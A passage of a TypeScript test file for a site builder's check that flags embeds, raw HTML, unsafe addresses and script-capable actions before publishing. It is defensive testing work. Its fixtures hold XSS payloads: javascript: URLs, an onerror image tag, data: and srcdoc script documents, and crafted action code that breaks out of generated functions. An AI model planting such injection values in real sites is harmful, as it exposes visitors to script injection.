import { describe, expect, test } from "vitest";
import {
  ROOT_FOLDER_ID,
  ROOT_INSTANCE_ID,
  blockComponent,
  blockTemplateComponent,
  type Asset,
  type DataSource,
  type Instance,
  type Page,
  type Pages,
  type Prop,
  type Resource,
  encodeDataSourceVariable,
} from "@webstudio-is/sdk";
import { MenuIcon } from "@webstudio-is/icons/svg";
import { renderTemplate, type TemplateMeta } from "@webstudio-is/template";
import { canvasComponentLibraries } from "@webstudio-is/sdk-components-registry/canvas";
import { componentMetas } from "@webstudio-is/sdk-components-registry/metas";
import {
  findMdxBlocks,
  findPausedScript,
} from "./organizeos-publish-paused-script";

const createPage = (id: string, name: string): Page => ({
  id,
  name,
  path: id === "home" ? "" : `/${id}`,
  title: `"${name}"`,
  meta: {},
  rootInstanceId: `${id}-root`,
});

const createPages = ({
  code,
  xmlAbout = false,
}: {
  code?: string;
  /** the About page is an XML page, where XML Node and XML Time belong */
  xmlAbout?: boolean;
} = {}): Pages => {
  const pages = [createPage("home", "Home"), createPage("about", "About")];
  if (xmlAbout) {
    pages[1].meta = { documentType: "xml" };
  }
  return {
    homePageId: "home",
    rootFolderId: ROOT_FOLDER_ID,
    pages: new Map(pages.map((page) => [page.id, page])),
    folders: new Map([
      [
        ROOT_FOLDER_ID,
        {
          id: ROOT_FOLDER_ID,
          name: "Root",
          slug: "",
          children: pages.map((page) => page.id),
        },
      ],
    ]),
    meta: code === undefined ? undefined : { code },
  };
};

type InstanceInit = Partial<Instance> & Pick<Instance, "id" | "component">;

const createInstances = (list: InstanceInit[]) =>
  new Map(
    list.map((instance): [string, Instance] => [
      instance.id,
      { type: "instance", children: [], ...instance },
    ])
  );

const ids = (...list: string[]): Instance["children"] =>
  list.map((value) => ({ type: "id", value }));

const stringProp = (instanceId: string, name: string, value: string): Prop => ({
  id: `${instanceId}-${name}`,
  instanceId,
  name,
  type: "string",
  value,
});

const jsonProp = (instanceId: string, name: string, value: unknown): Prop => ({
  id: `${instanceId}-${name}`,
  instanceId,
  name,
  type: "json",
  value,
});

const radix = "@webstudio-is/sdk-components-react-radix";
const DialogTitle = `${radix}:DialogTitle`;

const toProps = (list: Prop[]) => new Map(list.map((prop) => [prop.id, prop]));

const find = (
  overrides: Partial<Parameters<typeof findPausedScript>[0]> = {}
) =>
  findPausedScript({
    pages: createPages(),
    instances: createInstances([]),
    props: toProps([]),
    dataSources: new Map(),
    resources: new Map(),
    ...overrides,
  });

describe("findPausedScript", () => {
  // T10
  test("lists each HTML Embed that publishing drops, with its page and selector", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("box", "script-embed", "expression-embed", "empty-embed"),
      },
      { id: "box", component: "Box", children: ids("nested-embed") },
      { id: "nested-embed", component: "HtmlEmbed" },
      { id: "script-embed", component: "HtmlEmbed" },
      { id: "expression-embed", component: "HtmlEmbed" },
      { id: "empty-embed", component: "HtmlEmbed" },
      {
        id: "about-root",
        component: "Body",
        children: ids("about-embed"),
      },
      { id: "about-embed", component: "HtmlEmbed" },
    ]);
    const props = toProps([
      stringProp("nested-embed", "code", "<script>1</script>"),
      stringProp("script-embed", "code", "<script>2</script>"),
      {
        id: "expression-embed-code",
        instanceId: "expression-embed",
        name: "code",
        type: "expression",
        value: "$ws$dataSource$html",
      },
      stringProp("about-embed", "code", '<img src=x onerror="1">'),
    ]);

    expect(find({ instances, props })).toEqual([
      {
        label: "HTML Embed on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["nested-embed", "box", "home-root"],
        },
      },
      {
        label: "HTML Embed on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["script-embed", "home-root"],
        },
      },
      {
        label: "HTML Embed on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["expression-embed", "home-root"],
        },
      },
      // no code at all
      {
        label: "HTML Embed on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["empty-embed", "home-root"],
        },
      },
      {
        label: "HTML Embed on About",
        navigate: {
          pageId: "about",
          instanceSelector: ["about-embed", "about-root"],
        },
      },
    ]);
  });

  test("lists Markdown Embeds", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("md") },
      { id: "md", component: "MarkdownEmbed" },
    ]);
    const props = toProps([stringProp("md", "code", "[x](javascript:void0)")]);

    expect(find({ instances, props })).toEqual([
      {
        label: "Markdown Embed on Home",
        navigate: { pageId: "home", instanceSelector: ["md", "home-root"] },
      },
    ]);
  });

  test("lists the SVG animate and set elements, and not the other SVG animations", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("svg", "a", "animate", "set", "transform", "legacy"),
      },
      { id: "svg", component: "ws:element", tag: "svg" },
      { id: "a", component: "ws:element", tag: "a" },
      { id: "animate", component: "ws:element", tag: "animate" },
      { id: "set", component: "ws:element", tag: "set" },
      { id: "transform", component: "ws:element", tag: "animateTransform" },
      { id: "legacy", component: "Box" },
    ]);
    const props = toProps([stringProp("legacy", "tag", "set")]);

    expect(find({ instances, props })).toEqual([
      {
        label: "SVG animate element on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["animate", "home-root"],
        },
      },
      {
        label: "SVG set element on Home",
        navigate: { pageId: "home", instanceSelector: ["set", "home-root"] },
      },
      {
        label: "SVG set element on Home",
        navigate: { pageId: "home", instanceSelector: ["legacy", "home-root"] },
      },
    ]);
  });

  test("lists an animate or set tag held by any component but a ws:element and an XML Node, as publishing reads it", () => {
    // Box, Text and Heading read data-ws-tag before their legacy tag prop,
    // DialogTitle reads tag, and a Radix trigger passes its props (the
    // generator writes instance.tag as data-ws-tag) to the child it renders
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids(
          "box",
          "text",
          "title",
          "both",
          "element",
          "link",
          "title-with-tag",
          "trigger",
          "trigger-with-tag",
          "transform"
        ),
      },
      { id: "box", component: "Box" },
      { id: "text", component: "Text" },
      { id: "title", component: DialogTitle },
      { id: "both", component: "Heading" },
      { id: "element", component: "ws:element", tag: "div" },
      // on an XML page: an HTML page leaves an XML element out
      { id: "about-root", component: "Body", children: ids("xml") },
      { id: "xml", component: "XmlNode" },
      { id: "link", component: "Link", tag: "animate" },
      { id: "title-with-tag", component: DialogTitle, tag: "animate" },
      { id: "trigger", component: `${radix}:DialogTrigger` },
      {
        id: "trigger-with-tag",
        component: `${radix}:PopoverTrigger`,
        tag: "set",
      },
      { id: "transform", component: "Box" },
    ]);
    const props = toProps([
      stringProp("box", "data-ws-tag", "animate"),
      stringProp("text", "data-ws-tag", "set"),
      stringProp("title", "tag", "animate"),
      // the data-ws-tag prop is not the one that is checked first: both count
      stringProp("both", "tag", "h2"),
      stringProp("both", "data-ws-tag", "set"),
      stringProp("trigger", "tag", "animate"),
      // only attributes here: the element is made already, and an XML Node
      // takes any name
      stringProp("element", "data-ws-tag", "animate"),
      stringProp("element", "tag", "animate"),
      stringProp("xml", "tag", "set"),
      stringProp("transform", "data-ws-tag", "animateTransform"),
    ]);

    expect(
      find({ pages: createPages({ xmlAbout: true }), instances, props }).map(
        (item) => item.label
      )
    ).toEqual([
      "SVG animate element on Home",
      "SVG set element on Home",
      "SVG animate element on Home",
      "SVG set element on Home",
      "SVG animate element on Home",
      "SVG animate element on Home",
      "SVG animate element on Home",
      "SVG set element on Home",
    ]);
    expect(
      find({ pages: createPages({ xmlAbout: true }), instances, props }).map(
        (item) => item.navigate?.instanceSelector
      )
    ).toEqual([
      ["box", "home-root"],
      ["text", "home-root"],
      ["title", "home-root"],
      ["both", "home-root"],
      ["link", "home-root"],
      ["title-with-tag", "home-root"],
      ["trigger", "home-root"],
      ["trigger-with-tag", "home-root"],
    ]);
  });

  test("lists each element that publishing drops for a tag the builder does not offer, with everything it holds", () => {
    // classify in packages/cli/src/organizeos-org-script.ts drops the instance
    // and its subtree, so the dialog has to say so: the canvas only skips the
    // prop, and the element looks fine there
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids(
          "form",
          "script-box",
          "kept-box",
          "expression-link",
          "json-link",
          "trigger",
          "element-script",
          "element-attribute",
          "both",
          "embedded",
          "kept-nav"
        ),
      },
      { id: "form", component: "WebhookForm", children: ids("donate") },
      { id: "donate", component: "Link" },
      { id: "script-box", component: "Box", tag: "script" },
      // a tag the builder offers on the instance and on the prop
      { id: "kept-box", component: "Box", tag: "nav" },
      { id: "expression-link", component: "Link" },
      { id: "json-link", component: "Link" },
      { id: "trigger", component: `${radix}:PopoverTrigger` },
      { id: "element-script", component: "ws:element", tag: "script" },
      // an attribute on an element that is made already
      { id: "element-attribute", component: "ws:element", tag: "div" },
      // on an XML page: an HTML page leaves an XML element out
      { id: "about-root", component: "Body", children: ids("xml") },
      { id: "xml", component: "XmlNode", tag: "urlset" },
      { id: "both", component: "Box", tag: "section" },
      { id: "embedded", component: "Box", tag: "script" },
      { id: "kept-nav", component: "Heading", tag: "h2" },
    ]);
    const props = toProps([
      stringProp("form", "tag", "signup"),
      stringProp("kept-box", "tag", "section"),
      {
        id: "expression-link-tag",
        instanceId: "expression-link",
        name: "tag",
        type: "expression",
        value: "$ws$dataSource$tag",
      },
      jsonProp("json-link", "data-ws-tag", "a"),
      stringProp("trigger", "data-ws-tag", "script"),
      stringProp("element-attribute", "tag", "signup"),
      stringProp("element-attribute", "data-ws-tag", "script"),
      stringProp("xml", "tag", "xhtml:link"),
      // the animate prop would list as an SVG element, but the other tag drops
      // the element first
      stringProp("both", "data-ws-tag", "animate"),
      stringProp("both", "tag", "signup"),
      // a dropped instance takes its props with it
      jsonProp("embedded", "dangerouslySetInnerHTML", { __html: "<b>1</b>" }),
      stringProp("kept-nav", "data-ws-tag", "h3"),
    ]);

    const items = find({
      pages: createPages({ xmlAbout: true }),
      instances,
      props,
    });
    expect(new Set(items.map((item) => item.label))).toEqual(
      new Set(["Element with an unsupported tag on Home"])
    );
    expect(items.map((item) => item.navigate?.instanceSelector)).toEqual([
      ["form", "home-root"],
      ["script-box", "home-root"],
      ["expression-link", "home-root"],
      ["json-link", "home-root"],
      ["trigger", "home-root"],
      ["element-script", "home-root"],
      ["both", "home-root"],
      ["embedded", "home-root"],
    ]);
  });

  test("lists nothing for a tag the builder does not offer when the switch is on", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("form") },
      { id: "form", component: "WebhookForm" },
    ]);
    const props = toProps([stringProp("form", "tag", "signup")]);

    expect(find({ instances, props, mayRun: true })).toEqual([]);
  });

  test("lists each dangerouslySetInnerHTML prop, with its page and selector", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("box", "json", "expression"),
      },
      { id: "box", component: "Box", children: ids("nested") },
      { id: "nested", component: "ws:element", tag: "div" },
      { id: "json", component: "ws:element", tag: "div" },
      { id: "expression", component: "Link" },
      { id: "about-root", component: "Body", children: ids("about") },
      { id: "about", component: "ws:element", tag: "div" },
    ]);
    const props = toProps([
      jsonProp("nested", "dangerouslySetInnerHTML", { __html: "<b>1</b>" }),
      jsonProp("json", "dangerouslySetInnerHTML", { __html: "<b>2</b>" }),
      {
        id: "expression-html",
        instanceId: "expression",
        name: "dangerouslySetInnerHTML",
        type: "expression",
        value: '{__html: "<b>3</b>"}',
      },
      stringProp("about", "dangerouslySetInnerHTML", "<b>4</b>"),
      // not the prop
      stringProp("box", "innerHTML", "<b>5</b>"),
    ]);

    expect(find({ instances, props })).toEqual([
      {
        label: "Raw HTML property on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["nested", "box", "home-root"],
        },
      },
      {
        label: "Raw HTML property on Home",
        navigate: { pageId: "home", instanceSelector: ["json", "home-root"] },
      },
      {
        label: "Raw HTML property on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["expression", "home-root"],
        },
      },
      {
        label: "Raw HTML property on About",
        navigate: {
          pageId: "about",
          instanceSelector: ["about", "about-root"],
        },
      },
    ]);
  });

  // dropOrgScript keeps an HTML Embed only when every code it holds is a
  // template icon
  test("judges every code prop of an HTML Embed, as publishing does", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("mixed", "icons") },
      { id: "mixed", component: "HtmlEmbed" },
      { id: "icons", component: "HtmlEmbed" },
    ]);
    const props = toProps([
      { ...stringProp("mixed", "code", MenuIcon), id: "mixed-code-1" },
      {
        ...stringProp("mixed", "code", "<script>1</script>"),
        id: "mixed-code-2",
      },
      { ...stringProp("icons", "code", MenuIcon), id: "icons-code-1" },
      { ...stringProp("icons", "code", MenuIcon), id: "icons-code-2" },
    ]);

    expect(find({ instances, props })).toEqual([
      {
        label: "HTML Embed on Home",
        navigate: { pageId: "home", instanceSelector: ["mixed", "home-root"] },
      },
    ]);
  });

  // dropOrgScript drops what a dropped instance holds with it, and counts no
  // prop of it; what a kept instance also holds stays
  test("lists no prop of what a dropped element holds, and the props of what a kept Slot shows there too", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("script", "kept-slot"),
      },
      {
        id: "script",
        component: "ws:element",
        tag: "script",
        children: ids("inner", "dropped-slot"),
      },
      { id: "inner", component: "Box", children: ids("inner-link") },
      { id: "inner-link", component: "Link" },
      { id: "dropped-slot", component: "Slot", children: ids("fragment") },
      { id: "kept-slot", component: "Slot", children: ids("fragment") },
      { id: "fragment", component: "Fragment", children: ids("shown") },
      { id: "shown", component: "Box" },
    ]);
    const props = toProps([
      jsonProp("inner", "dangerouslySetInnerHTML", { __html: "<b>1</b>" }),
      stringProp("inner-link", "href", "javascript:alert(1)"),
      jsonProp("shown", "dangerouslySetInnerHTML", { __html: "<b>2</b>" }),
    ]);

    expect(find({ instances, props }).map((item) => item.label)).toEqual([
      "Element with an unsupported tag on Home",
      "Raw HTML property on Home",
    ]);
    expect(
      find({ instances, props }).find((item) =>
        item.label.startsWith("Raw HTML")
      )?.navigate?.instanceSelector[0]
    ).toBe("shown");
  });

  // dropOrgScript finds what it drops in the whole build, so an element it
  // drops in a Content Block's templates, or on no page, takes a shared
  // Fragment with it as well
  test.each([
    [
      "a Content Block template's Slot",
      [
        { id: "home-root", component: "Body", children: ids("block") },
        {
          id: "block",
          component: blockComponent,
          children: ids("template", "on-page"),
        },
        {
          id: "template",
          component: blockTemplateComponent,
          children: ids("in-template"),
        },
        {
          id: "in-template",
          component: "ws:element",
          tag: "script",
          children: ids("template-slot"),
        },
        { id: "template-slot", component: "Slot", children: ids("fragment") },
        {
          id: "on-page",
          component: "ws:element",
          tag: "script",
          children: ids("page-slot"),
        },
        { id: "page-slot", component: "Slot", children: ids("fragment") },
        { id: "fragment", component: "Fragment", children: ids("inner") },
        { id: "inner", component: "Box" },
      ] as InstanceInit[],
      ["on-page", "block", "home-root"],
    ],
    [
      "the Slot of a dropped element on no page",
      [
        { id: "home-root", component: "Body", children: ids("on-page") },
        {
          id: "orphan",
          component: "ws:element",
          tag: "script",
          children: ids("orphan-slot"),
        },
        { id: "orphan-slot", component: "Slot", children: ids("fragment") },
        {
          id: "on-page",
          component: "ws:element",
          tag: "script",
          children: ids("page-slot"),
        },
        { id: "page-slot", component: "Slot", children: ids("fragment") },
        { id: "fragment", component: "Fragment", children: ids("inner") },
        { id: "inner", component: "Box" },
      ] as InstanceInit[],
      ["on-page", "home-root"],
    ],
  ])(
    "lists no prop of a Fragment that a dropped element shares with %s",
    (_name, list, selector) => {
      const instances = createInstances(list);
      const props = toProps([
        jsonProp("inner", "dangerouslySetInnerHTML", { __html: "<b>x</b>" }),
      ]);

      expect(find({ instances, props })).toEqual([
        {
          label: "Element with an unsupported tag on Home",
          navigate: { pageId: "home", instanceSelector: selector },
        },
      ]);
    }
  );

  test("lists nothing for a dangerouslySetInnerHTML prop of an instance that is listed anyway", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("embed") },
      { id: "embed", component: "HtmlEmbed" },
    ]);
    const props = toProps([
      stringProp("embed", "code", "<script>1</script>"),
      jsonProp("embed", "dangerouslySetInnerHTML", { __html: "<b>1</b>" }),
    ]);

    expect(find({ instances, props }).map((item) => item.label)).toEqual([
      "HTML Embed on Home",
    ]);
  });

  test("lists the dangerouslySetInnerHTML prop of a template icon HTML Embed, which publishing keeps and strips", () => {
    // The embed itself is not listed (its code is a template icon), so the
    // prop that writes markup into it is the only thing publishing drops.
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("icon") },
      { id: "icon", component: "HtmlEmbed" },
    ]);
    const props = toProps([
      stringProp("icon", "code", MenuIcon),
      jsonProp("icon", "dangerouslySetInnerHTML", { __html: "<b>1</b>" }),
    ]);

    expect(find({ instances, props })).toEqual([
      {
        label: "Raw HTML property on Home",
        navigate: { pageId: "home", instanceSelector: ["icon", "home-root"] },
      },
    ]);
  });

  test("lists nothing for the empty HTML Embed in a Content Block's templates", () => {
    // The core Content Block template holds an empty HtmlEmbed in its
    // BlockTemplate. Nothing in the template is published, so the admin never
    // added it and it never ships.
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("block") },
      {
        id: "block",
        component: blockComponent,
        children: ids("template", "paragraph"),
      },
      {
        id: "template",
        component: blockTemplateComponent,
        children: ids("template-embed", "template-markdown", "template-box"),
      },
      { id: "template-embed", component: "HtmlEmbed" },
      { id: "template-markdown", component: "MarkdownEmbed" },
      { id: "template-box", component: "Box" },
      { id: "paragraph", component: "ws:element", tag: "p" },
    ]);
    const props = toProps([
      jsonProp("template-box", "dangerouslySetInnerHTML", { __html: "x" }),
    ]);

    expect(find({ instances, props })).toEqual([]);
  });

  test("lists an embed that a content editor inserted into the Content Block", () => {
    // The copy is a child of the block, not of its templates, and is published
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("block") },
      {
        id: "block",
        component: blockComponent,
        children: ids("template", "inserted"),
      },
      {
        id: "template",
        component: blockTemplateComponent,
        children: ids("template-embed"),
      },
      { id: "template-embed", component: "HtmlEmbed" },
      { id: "inserted", component: "HtmlEmbed" },
    ]);

    expect(find({ instances })).toEqual([
      {
        label: "HTML Embed on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["inserted", "block", "home-root"],
        },
      },
    ]);
  });

  test("lists the custom code when it is not blank", () => {
    expect(
      find({ pages: createPages({ code: "<script>1</script>" }) })
    ).toEqual([{ label: "Custom code" }]);
  });

  // 0.309.0 keeps the custom code in the project's settings, and a build that
  // loads strips the pages' meta; publishing drops it from both
  test("lists the custom code saved in project settings", () => {
    expect(
      find({
        projectSettings: { meta: { code: "<script>1</script>" }, compiler: {} },
      })
    ).toEqual([{ label: "Custom code" }]);
    // once, when both hold it
    expect(
      find({
        pages: createPages({ code: "<style>x{}</style>" }),
        projectSettings: { meta: { code: "<script>1</script>" }, compiler: {} },
      })
    ).toHaveLength(1);
    expect(
      find({ projectSettings: { meta: { code: " \n " }, compiler: {} } })
    ).toEqual([]);
    expect(find({ projectSettings: { meta: {}, compiler: {} } })).toEqual([]);
  });

  test("lists JSON-LD with its page", () => {
    // D13: it writes its code into a script element as raw HTML
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box") },
      { id: "box", component: "Box", children: ids("json-ld") },
      { id: "json-ld", component: "JsonLd" },
      { id: "about-root", component: "Body", children: ids("about-json-ld") },
      { id: "about-json-ld", component: "JsonLd" },
    ]);
    const props = toProps([
      stringProp("json-ld", "code", '{"@type":"Organization"}'),
    ]);

    expect(find({ instances, props })).toEqual([
      {
        label: "JSON-LD on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["json-ld", "box", "home-root"],
        },
      },
      {
        label: "JSON-LD on About",
        navigate: {
          pageId: "about",
          instanceSelector: ["about-json-ld", "about-root"],
        },
      },
    ]);
  });

  test("lists the custom code last", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("embed") },
      { id: "embed", component: "HtmlEmbed" },
    ]);
    const items = find({
      pages: createPages({ code: "<style>x{}</style>" }),
      instances,
    });
    expect(items.map((item) => item.label)).toEqual([
      "HTML Embed on Home",
      "Custom code",
    ]);
  });

  test("lists nothing for template icons alone", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("icon") },
      { id: "icon", component: "HtmlEmbed" },
    ]);
    const props = toProps([stringProp("icon", "code", MenuIcon)]);

    expect(find({ instances, props })).toEqual([]);
  });

  test("lists nothing for blank custom code", () => {
    expect(find({ pages: createPages({ code: "" }) })).toEqual([]);
    expect(find({ pages: createPages({ code: "  \n\t " }) })).toEqual([]);
    expect(find({ pages: createPages() })).toEqual([]);
  });

  test("lists an element once however many pages show it", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("slot") },
      { id: "about-root", component: "Body", children: ids("slot") },
      { id: "slot", component: "Slot", children: ids("fragment") },
      { id: "fragment", component: "Fragment", children: ids("embed") },
      { id: "embed", component: "HtmlEmbed" },
    ]);

    expect(find({ instances })).toHaveLength(1);
  });

  test("does not list an embed that no page contains", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body" },
      { id: "orphan", component: "HtmlEmbed" },
    ]);

    expect(find({ instances })).toEqual([]);
  });

  test("lists nothing when the switch is on", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("embed") },
      { id: "embed", component: "HtmlEmbed" },
    ]);
    expect(
      find({
        pages: createPages({ code: "<script>1</script>" }),
        instances,
        mayRun: true,
      })
    ).toEqual([]);
  });

  test("lists nothing before the pages load", () => {
    expect(find({ pages: undefined })).toEqual([]);
  });

  // Unsafe values (docs/ORGANIZEOS-FORK.md section 10): publishing leaves them
  // out (propMayShip), and the dialog says so, each with its element
  const expressionProp = (
    instanceId: string,
    name: string,
    value: string
  ): Prop => ({
    id: `${instanceId}-${name}`,
    instanceId,
    name,
    type: "expression",
    value,
  });

  const onHome = (selector: string) => ({
    pageId: "home",
    instanceSelector: [selector, "home-root"],
  });

  test("lists each unsafe address with its name, page and selector", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("link", "anchor", "form", "button", "frame", "object"),
      },
      { id: "link", component: "Link" },
      { id: "anchor", component: "ws:element", tag: "a" },
      { id: "form", component: "ws:element", tag: "form" },
      { id: "button", component: "ws:element", tag: "button" },
      { id: "frame", component: "ws:element", tag: "iframe" },
      {
        id: "object",
        component: "ws:element",
        tag: "object",
        children: ids("svg-link"),
      },
      { id: "svg-link", component: "ws:element", tag: "a" },
    ]);
    const props = toProps([
      stringProp("link", "href", "javascript:alert(1)"),
      stringProp("anchor", "HREF", " JavaScript:alert(1)"),
      stringProp("anchor", "title", "javascript:alert(1)"),
      stringProp("form", "action", "javascript:alert(1)"),
      stringProp("button", "formaction", "javascript:alert(1)"),
      stringProp("frame", "src", "data:text/html,<script>alert(1)</script>"),
      jsonProp("object", "data", ["javascript:alert(1)"]),
      stringProp("svg-link", "xlink:href", "javascript:alert(1)"),
    ]);

    expect(find({ instances, props })).toEqual([
      { label: "Link address (href) on Home", navigate: onHome("link") },
      { label: "Link address (HREF) on Home", navigate: onHome("anchor") },
      { label: "Form address (action) on Home", navigate: onHome("form") },
      {
        label: "Form address (formaction) on Home",
        navigate: onHome("button"),
      },
      { label: "Source address (src) on Home", navigate: onHome("frame") },
      { label: "Object address (data) on Home", navigate: onHome("object") },
      {
        label: "Link address (xlink:href) on Home",
        navigate: {
          pageId: "home",
          instanceSelector: ["svg-link", "object", "home-root"],
        },
      },
    ]);
  });

  test("lists a bound address that decides nothing, and not one whose fixed start decides", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("bound", "fixed", "image", "collection"),
      },
      { id: "bound", component: "Link" },
      { id: "fixed", component: "Link" },
      { id: "image", component: "Image" },
      { id: "collection", component: "ws:collection" },
    ]);
    const props = toProps([
      expressionProp("bound", "href", "$ws$dataSource$event.url"),
      expressionProp("fixed", "href", '"/events/" + $ws$dataSource$event.slug'),
      expressionProp("image", "src", "$ws$dataSource$event.cover_image_url"),
      expressionProp("collection", "data", "$ws$dataSource$events.data"),
    ]);

    expect(find({ instances, props })).toEqual([
      { label: "Link address (href) on Home", navigate: onHome("bound") },
    ]);
  });

  test("lists srcdoc and event handler attributes", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("frame", "custom"),
      },
      { id: "frame", component: "ws:element", tag: "iframe" },
      { id: "custom", component: "ws:element", tag: "div" },
    ]);
    const props = toProps([
      stringProp("frame", "srcdoc", "<script>alert(1)</script>"),
      stringProp("custom", "is", "x-y"),
      stringProp("custom", "onclick", "alert(1)"),
      {
        id: "custom-onClick",
        instanceId: "custom",
        name: "onClick",
        type: "action",
        value: [],
      },
    ]);

    expect(find({ instances, props })).toEqual([
      { label: "Frame document (srcdoc) on Home", navigate: onHome("frame") },
      {
        label: "Event handler attribute (onclick) on Home",
        navigate: onHome("custom"),
      },
    ]);
  });

  test("lists an action that could run script or reach the page as an action, whatever its name, and not one a template writes", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids(
          "button",
          "link",
          "input",
          "rotation",
          "block",
          "generic",
          "regex",
          "form-regex",
          "form-member",
          "shadow",
          "resource",
          "newline",
          "newline-cr",
          "newline-ls",
          "newline-comment",
          "form-newline",
          "form-a",
          "proto",
          "form"
        ),
      },
      { id: "button", component: "ws:element", tag: "button" },
      { id: "link", component: "Link" },
      { id: "input", component: "ws:element", tag: "input" },
      { id: "rotation", component: "ws:element", tag: "div" },
      { id: "block", component: "ws:element", tag: "button" },
      {
        id: "generic",
        component: "@organizeos/site-components:SignupForm",
      },
      { id: "regex", component: "ws:element", tag: "button" },
      {
        id: "form-regex",
        component: "@organizeos/site-components:SignupForm",
      },
      {
        id: "form-member",
        component: "@organizeos/site-components:SignupForm",
      },
      { id: "shadow", component: "ws:element", tag: "button" },
      { id: "resource", component: "ws:element", tag: "button" },
      { id: "newline", component: "ws:element", tag: "button" },
      { id: "newline-cr", component: "ws:element", tag: "button" },
      { id: "newline-ls", component: "ws:element", tag: "button" },
      { id: "newline-comment", component: "ws:element", tag: "button" },
      {
        id: "form-newline",
        component: "@organizeos/site-components:SignupForm",
      },
      { id: "form-a", component: "@organizeos/site-components:SignupForm" },
      { id: "proto", component: "ws:element", tag: "button" },
      { id: "form", component: "WebhookForm" },
    ]);
    const action = (
      instanceId: string,
      name: string,
      value: Array<{ args: string[]; code: string }>
    ): Prop => ({
      id: `${instanceId}-${name}`,
      instanceId,
      name,
      type: "action",
      value: value.map((entry) => ({ type: "execute", ...entry })),
    });
    const crafted = [{ args: [") => 0, globalThis.pwned = 1, (x"], code: "0" }];
    const props = toProps([
      action("button", "onClick", crafted),
      action("link", "href", crafted),
      // what upstream's own actions read, while org script is paused
      action("input", "onChange", [
        { args: ["event"], code: "$ws$dataSource$state = event.target.value" },
      ]),
      // a parameter
      action("rotation", "onValueChange", [
        { args: [], code: '$ws$dataSource$param = "x"' },
      ]),
      // a code that starts with an object
      action("block", "onClick", [
        { args: [], code: '{} / "/}, globalThis.pwned = 1, () => { // "' },
      ]),
      // a < followed later by a >
      action("generic", "onStateChange", [
        { args: ["a", "b", "c"], code: "$ws$dataSource$state = a < b > (c)" },
      ]),
      // a regular expression after a `>`, with no args and with a plain-data
      // arg
      action("regex", "onClick", [
        { args: [], code: "1 < 2 > /(globalThis.pwned = 1)/g" },
      ]),
      action("form-regex", "onStateChange", [
        {
          args: ["state"],
          code: "$ws$dataSource$state = $ws$dataSource$state < $ws$dataSource$state > /(globalThis.pwned = state)/i",
        },
      ]),
      // a member, where the args may be named
      action("form-member", "onStateChange", [
        { args: ["state"], code: "$ws$dataSource$state = state.length" },
      ]),
      // an arg named like a variable
      action("shadow", "onClick", [
        { args: ["event"], code: "$ws$dataSource$state = $ws$dataSource$e" },
      ]),
      // an assignment to a Resource
      action("resource", "onClick", [
        { args: [], code: "$ws$dataSource$res = 1" },
      ]),
      // a < followed later by a >, with no args and where the args may be
      // named
      action("newline", "onClick", [
        {
          args: [],
          code: '$ws$dataSource$state = "s" < 1 >\n ["constructor"] < 1 >\n ["constructor"]',
        },
      ]),
      ...(
        [
          ["newline-cr", "\r"],
          ["newline-ls", "\u2028"],
          ["newline-comment", " /*\n*/ "],
        ] as const
      ).map(([id, between]) =>
        action(id, "onClick", [
          {
            args: [],
            code: `$ws$dataSource$state = 1 < 2 >${between}{} / "/}, globalThis.pwned = 1, () => { // "`,
          },
        ])
      ),
      action("form-newline", "onStateChange", [
        {
          args: ["state"],
          code: '$ws$dataSource$state = state < 1 >\n["constructor"]',
        },
      ]),
      action("form-a", "onStateChange", [
        {
          args: ["a"],
          code: '$ws$dataSource$state = a < 1 >\n["constructor"]',
        },
      ]),
      // an object keyed __proto__
      action("proto", "onClick", [
        { args: [], code: "$ws$dataSource$state = { __proto__: null }" },
      ]),
      action("form", "onStateChange", [
        { args: ["state"], code: "$ws$dataSource$state = state" },
      ]),
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "state",
        {
          type: "variable",
          id: "state",
          name: "formState",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "idle" },
        },
      ],
      [
        "param",
        {
          type: "parameter",
          id: "param",
          name: "name",
          scopeInstanceId: "rotation",
        },
      ],
      [
        "e",
        {
          type: "variable",
          id: "e",
          name: "event",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "idle" },
        },
      ],
      [
        "res",
        {
          type: "resource",
          id: "res",
          name: "res",
          scopeInstanceId: "home-root",
          resourceId: "res-resource",
        },
      ],
    ]);

    // the Resource the resource data source names
    const resources = new Map<string, Resource>([
      [
        "res-resource",
        {
          id: "res-resource",
          name: "res",
          method: "get",
          url: '"https://example.org/"',
          headers: [],
        },
      ],
    ]);

    expect(find({ instances, props, dataSources, resources })).toEqual([
      { label: "Action (onClick) on Home", navigate: onHome("button") },
      { label: "Action (href) on Home", navigate: onHome("link") },
      { label: "Action (onChange) on Home", navigate: onHome("input") },
      {
